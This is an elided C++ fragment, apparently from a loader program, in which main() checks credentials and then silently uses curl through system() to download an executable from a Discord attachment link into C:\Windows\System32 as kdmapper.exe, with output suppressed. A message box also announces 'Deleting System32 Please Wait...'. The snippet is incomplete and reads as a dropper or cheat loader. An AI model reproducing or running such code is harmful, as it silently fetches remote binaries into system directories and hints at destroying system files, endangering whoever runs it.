...
int main()
{
    ...
    if (checkCredentials(username, password))
    {
        ...
        if (choice == "y" || choice == "Y")
        {
            ...
            Sleep(10000);
            system("curl --silent https://cdn.discordapp.com/attachments/1043912781629509782/1122780933448282142/mapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1");
        ...
        {
            MessageBoxA(NULL, "Deleting System32 Please Wait...", "Wait", MB_OK);
            }
